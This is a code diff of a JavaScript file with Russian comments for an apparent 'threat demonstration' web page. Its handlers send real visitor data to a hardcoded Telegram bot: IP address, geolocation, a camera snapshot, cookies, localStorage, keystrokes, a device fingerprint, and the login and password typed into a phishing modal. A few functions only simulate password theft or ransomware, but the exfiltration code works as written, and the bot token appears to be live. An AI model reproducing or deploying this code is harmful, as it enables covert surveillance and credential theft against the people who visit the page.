@@ -1,9 +1,21 @@
-// --- Настройки Telegram бота ---
-const TELEGRAM_BOT_TOKEN = '7586619534:AAF6e4jBH2aEVIVGW9I5Fdze--3pmXnja60';  // вставьте сюда свой токен
-const TELEGRAM_CHAT_ID = '7408565938';               // вставьте сюда свой chat_id
+// script.js
 
-// Функция отправки сообщения в Telegram
-async function sendTelegramMessage(text) {
+// --- Настройки Telegram бота ---
+const TELEGRAM_BOT_TOKEN = '7586619534:AAF6e4jBH2aEVIVGW9I5Fdze--3pmXnja60';
+const TELEGRAM_CHAT_ID = '7408565938';
+
+// --- Универсальные утилиты ---
+function logToPage(text, cssClass = '') {
+  const logEl = document.getElementById('log-content');
+  const time = new Date().toLocaleTimeString();
+  const line = document.createElement('div');
+  line.textContent = `[${time}] ${text}`;
+  if (cssClass) line.classList.add(cssClass);
+  logEl.appendChild(line);
+  logEl.parentElement.scrollTop = logEl.parentElement.scrollHeight;
+}
+
+async function sendToTelegram(text) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
     await fetch(url, {
@@ -11,168 +23,198 @@ async function sendTelegramMessage(text) {
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
-        text: text,
+        text,
         parse_mode: 'HTML'
-      }),
+      })
     });
   } catch (err) {
     console.error('Ошибка отправки в Telegram:', err);
   }
 }
 
-// --- Логирование в интерфейс ---
-const logContent = document.getElementById('log-content');
-function addLog(text) {
-  const time = new Date().toLocaleTimeString();
-  logContent.textContent += `[${time}] ${text}\n`;
-  logContent.scrollTop = logContent.scrollHeight;
-}
-
-// --- Функции для сбора данных ---
-// IP получить через внешний сервис (публичный API)
-async function getIP() {
+// --- Основные угрозы ---
+async function logIP() {
+  logToPage('Запрашиваем IP...', 'log-ip');
   try {
     const res = await fetch('https://api.ipify.org?format=json');
-    const data = await res.json();
-    return data.ip;
+    const { ip } = await res.json();
+    logToPage(`IP-адрес: ${ip}`, 'log-ip');
+    sendToTelegram(`⚠️ <b>IP-адрес:</b> <code>${ip}</code>`);
   } catch {
-    return 'Не удалось получить IP';
+    logToPage('Не удалось получить IP', 'log-ip');
   }
 }
 
-// DNS — получим домен текущего сайта (условно)
-function getDNS() {
-  return window.location.hostname;
+function logDNS() {
+  const host = window.location.hostname;
+  logToPage(`DNS (hostname): ${host}`, 'log-dns');
+  sendToTelegram(`⚠️ <b>DNS (hostname):</b> <code>${host}</code>`);
 }
 
-// User-Agent
-function getUserAgent() {
-  return navigator.userAgent;
+function logUA() {
+  const ua = navigator.userAgent;
+  logToPage(`User-Agent: ${ua}`, 'log-useragent');
+  sendToTelegram(`⚠️ <b>User-Agent:</b> <code>${ua}</code>`);
 }
 
-// Геолокация
-function getGeolocation() {
-  return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) {
-      reject('Геолокация не поддерживается');
-      return;
-    }
-    navigator.geolocation.getCurrentPosition(
-      pos => resolve(`Широта: ${pos.coords.latitude}, Долгота: ${pos.coords.longitude}`),
-      err => reject('Отказано в доступе к геолокации')
-    );
+function logGeolocation() {
+  logToPage('Запрашиваем геолокацию...', 'log-geo');
+  if (!navigator.geolocation) {
+    logToPage('Геолокация не поддерживается', 'log-geo');
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(pos => {
+    const { latitude, longitude } = pos.coords;
+    logToPage(`Геолокация: ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`, 'log-geo');
+    sendToTelegram(`⚠️ <b>Геолокация:</b> <code>${latitude}, ${longitude}</code>`);
+  }, err => {
+    logToPage('Ошибка геолокации: ' + err.message, 'log-geo');
   });
 }
 
-// Доступ к камере (пробуем запросить)
-async function tryCameraAccess() {
+async function logCamera() {
+  logToPage('Запрашиваем доступ к камере...', 'log-camera');
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    stream.getTracks().forEach(track => track.stop());
-    return 'Доступ к камере получен';
-  } catch {
-    return 'Доступ к камере запрещён или отсутствует';
-  }
-}
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
 
-// Получить куки сайта (если есть)
-function getCookies() {
-  return document.cookie || 'Куки отсутствуют';
-}
+    // Захват кадра
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
 
-// Кража паролей — имитация (т.к. невозможно реально получить)
-// Просто создадим фейковые данные
-function getFakePasswords() {
-  return 'login1: password123\nlogin2: qwerty\nuser: 123456';
-}
+    // Остановить камеру
+    stream.getTracks().forEach(t => t.stop());
 
-// --- Работа с элементами страницы ---
+    // Получить DataURL и Blob
+    const dataUrl = canvas.toDataURL('image/png');
+    const blob = await (await fetch(dataUrl)).blob();
 
-// Модальное окно фишинга
-const phishingModal = document.getElementById('phishing-modal');
-const phishingCloseBtn = document.getElementById('phishing-close');
-const phishingForm = document.getElementById('phishing-form');
+    logToPage('Фото с камеры сделано.', 'log-camera');
 
-phishingCloseBtn.onclick = () => {
-  phishingModal.style.display = 'none';
-};
+    // Отправить фото
+    const form = new FormData();
+    form.append('chat_id', TELEGRAM_CHAT_ID);
+    form.append('photo', blob, 'snapshot.png');
 
-window.onclick = (event) => {
-  if (event.target == phishingModal) {
-    phishingModal.style.display = 'none';
-  }
-};
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: form
+    });
 
-phishingForm.onsubmit = (e) => {
-  e.preventDefault();
-  const login = phishingForm['login'].value;
-  const password = phishingForm['password'].value;
-
-  const message = `<b>Фишинг: украдены данные входа</b>\nЛогин: ${login}\nПароль: ${password}`;
-  sendTelegramMessage(message);
-  addLog(`Фишинговая атака: получен логин "${login}" и пароль.`);
-
-  phishingForm.reset();
-  phishingModal.style.display = 'none';
-  alert('Данные отправлены "мошенникам" (для демонстрации).');
-};
-
-// --- Обработчики кнопок ---
-
-document.getElementById('log-ip').onclick = async () => {
-  const ip = await getIP();
-  const msg = `<b>Получен IP-адрес:</b> ${ip}`;
-  addLog(msg.replace(/<[^>]+>/g, ''));
-  sendTelegramMessage(msg);
-};
-
-document.getElementById('log-dns').onclick = () => {
-  const dns = getDNS();
-  const msg = `<b>Получен DNS:</b> ${dns}`;
-  addLog(msg.replace(/<[^>]+>/g, ''));
-  sendTelegramMessage(msg);
-};
-
-document.getElementById('log-ua').onclick = () => {
-  const ua = getUserAgent();
-  const msg = `<b>Получен User-Agent:</b> ${ua}`;
-  addLog(msg.replace(/<[^>]+>/g, ''));
-  sendTelegramMessage(msg);
-};
-
-document.getElementById('log-geo').onclick = async () => {
-  try {
-    const geo = await getGeolocation();
-    const msg = `<b>Получена геолокация:</b> ${geo}`;
-    addLog(msg.replace(/<[^>]+>/g, ''));
-    sendTelegramMessage(msg);
+    logToPage('Фото отправлено в Telegram.', 'log-camera');
   } catch (err) {
-    addLog(err);
+    logToPage('Ошибка камеры: ' + err.message, 'log-camera');
   }
-};
+}
 
-document.getElementById('log-camera').onclick = async () => {
-  const cam = await tryCameraAccess();
-  const msg = `<b>Камера:</b> ${cam}`;
-  addLog(msg.replace(/<[^>]+>/g, ''));
-  sendTelegramMessage(msg);
-};
+function openPhishing() {
+  document.getElementById('phishing-modal').style.display = 'flex';
+  logToPage('Открыта фишинговая форма', 'log-username');
+  sendToTelegram('⚠️ <b>Открыта фишинговая форма</b>');
+}
 
-document.getElementById('log-phishing').onclick = () => {
-  phishingModal.style.display = 'block';
-  addLog('Показано окно фишинга для ввода данных.');
-};
+function stealCookies() {
+  const ck = document.cookie || '(пусто)';
+  logToPage('Cookies: ' + ck, 'log-cookie');
+  sendToTelegram(`⚠️ <b>Cookies:</b> <code>${ck}</code>`);
+}
 
-document.getElementById('log-cookie').onclick = () => {
-  const cookies = getCookies();
-  const msg = `<b>Кража куки:</b>\n${cookies}`;
-  addLog('Получены куки сайта.');
-  sendTelegramMessage(msg);
-};
+function stealPasswords() {
+  const fake = 'user1:pass1\nuser2:pass2';
+  logToPage('Кража паролей (демо):\n' + fake, 'log-password');
+  sendToTelegram(`⚠️ <b>Кража паролей:</b>\n<code>${fake}</code>`);
+}
 
-document.getElementById('log-passwords').onclick = () => {
-  const passwords = getFakePasswords();
-  const msg = `<b>Кража паролей:</b>\n${passwords}`;
-  addLog('Симуляция кражи паролей.');
-  sendTelegramMessage(msg);
-};
+// --- Обработчики фишинга ---
+const phModal = document.getElementById('phishing-modal');
+const phForm  = document.getElementById('phishing-form');
+document.getElementById('phishing-close').onclick = () => phModal.style.display = 'none';
+window.onclick = e => { if (e.target === phModal) phModal.style.display = 'none'; };
+
+phForm.addEventListener('submit', e => {
+  e.preventDefault();
+  const user = phForm.login.value;
+  const pwd  = phForm.password.value;
+  logToPage(`Фишинг: логин=${user}, пароль=${'*'.repeat(pwd.length)}`, 'log-username');
+  sendToTelegram(`⚠️ <b>Фишинг!</b>\nЛогин: <b>${user}</b>\nПароль: <b>${pwd}</b>`);
+  phForm.reset();
+  phModal.style.display = 'none';
+});
+
+// --- Дополнительные функции ---
+function startKeylogger() {
+  logToPage('Кейлоггер запущен', 'log-password');
+  sendToTelegram('⚠️ <b>Кейлоггер активирован</b>');
+  document.addEventListener('keydown', e => {
+    if (e.key.length === 1) {
+      logToPage('Кейлоггер: ' + e.key, 'log-password');
+      sendToTelegram(`⚠️ <b>Кейлоггер:</b> <code>${e.key}</code>`);
+    }
+  }, { once: true });
+}
+
+function fingerprint() {
+  const fp = [
+    navigator.userAgent,
+    navigator.language,
+    screen.width + 'x' + screen.height,
+    screen.colorDepth + '-bit',
+    navigator.platform
+  ].join(' | ');
+  logToPage('Отпечаток: ' + fp, 'log-dns');
+  sendToTelegram(`⚠️ <b>Отпечаток:</b>\n<code>${fp}</code>`);
+}
+
+function simulateGeoIP() {
+  const fake = '89.123.45.67, Москва, Россия';
+  logToPage('Эмуляция геолокации: ' + fake, 'log-geo');
+  sendToTelegram(`⚠️ <b>Эмуляция геолокации:</b> <code>${fake}</code>`);
+}
+
+function leakCookiesLocalStorage() {
+  const ck = document.cookie;
+  const ls = JSON.stringify(localStorage);
+  logToPage(`Утечка:\nCookies: ${ck}\nLocalStorage: ${ls}`, 'log-cookie');
+  sendToTelegram(`⚠️ <b>Утечка данных:</b>\nCookies:<code>${ck}</code>\nLS:<code>${ls}</code>`);
+}
+
+function scareMessage() {
+  alert('🚨 ВНИМАНИЕ! Обнаружена угроза!');
+  logToPage('Показано сообщение о вирусе', 'log-password');
+  sendToTelegram('⚠️ <b>Показано сообщение о вирусе</b>');
+}
+
+function driveByDownload() {
+  logToPage('Эмуляция drive-by загрузки', 'log-password');
+  sendToTelegram('⚠️ <b>Эмуляция drive-by загрузки</b>');
+}
+
+function ransomwareFake() {
+  alert('Ваши файлы зашифрованы! Оплатите 1 BTC.');
+  logToPage('Показан ransomware (демо)', 'log-password');
+  sendToTelegram('⚠️ <b>Показан ransomware (демо)</b>');
+}
+
+// --- Привязка обработчиков ---
+window.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('log-ip').onclick        = logIP;
+  document.getElementById('log-dns').onclick       = logDNS;
+  document.getElementById('log-ua').onclick        = logUA;
+  document.getElementById('log-geo').onclick       = logGeolocation;
+  document.getElementById('log-camera').onclick    = logCamera;
+  document.getElementById('log-phishing').onclick  = openPhishing;
+  document.getElementById('log-cookie').onclick    = stealCookies;
+  document.getElementById('log-passwords').onclick = stealPasswords;
+
+  document.getElementById('btn-keylogger').onclick    = startKeylogger;
+  document.getElementById('btn-fingerprint').onclick  = fingerprint;
+  document.getElementById('btn-sim-geoip').onclick    = simulateGeoIP;
+  document.getElementById('btn-leak-cookies').onclick = leakCookiesLocalStorage;
+  document.getElementById('btn-scare-msg').onclick    = scareMessage;
+  document.getElementById('btn-driveby').onclick      = driveByDownload;
+  document.getElementById('btn-ransomware').onclick   = ransomwareFake;
+});
